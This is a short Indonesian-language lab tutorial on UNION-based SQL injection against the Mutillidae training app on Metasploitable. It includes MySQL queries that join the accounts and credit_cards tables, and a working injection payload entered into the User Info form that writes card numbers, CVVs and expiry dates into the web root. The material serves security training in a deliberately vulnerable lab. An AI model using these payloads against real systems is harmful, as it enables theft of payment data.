## Lesson 9 - SQL Injection Union Exploit \#2

### \# Penjelasan Database Union

* **Step 1** : Masuk ke dalam database Mutillidae di Metasploitable OS

```
su - root
mysql -uroot
use owasp10;
show tables;
```
didalam database terdapat tabel _accounts_ dan _credit_cards_. 2 tabel tersebut akan kita union kan. **UNION** adalah operasi penggabungan lebih dari satu hasil **SELECT** dalam SQL

* **Step 2** : Melakukan operasi UNION

Operasi UNION menampilkan di terminal
```
select * from accounts where username RLIKE '^[0-9]' union select ccid, ccnumber, ccv, expiration, null from credit_cards;
```
Operasi UNION mencetak di file yang berlokasi di **'/tmp/CCN.csv'**
```
select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/tmp/CCN.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED by '\n';
\! cat /tmp/CCN.csv
```

### \# SQL Injection (Union with Curl)

* **Step 1** : Buka halaman user info. Pilih sidebar. OWASP Top 10 --&gt; A1 - SQL Injection --&gt; SQLi - Extract Data --&gt; User Info
  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_03_01_34.png)

* **Step 2** : Ubah ukuran text box username menjadi 100% menggunakan inspect element agar text box lebih panjang untuk menuliskan syntax SQL Injection.  
  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_20_37_43.png)

* **Step 3** : Masukkan operasi sql di bawah di dalam textbox **Name** lalu tekan tombol _View Account Details_
```
' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/html/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
```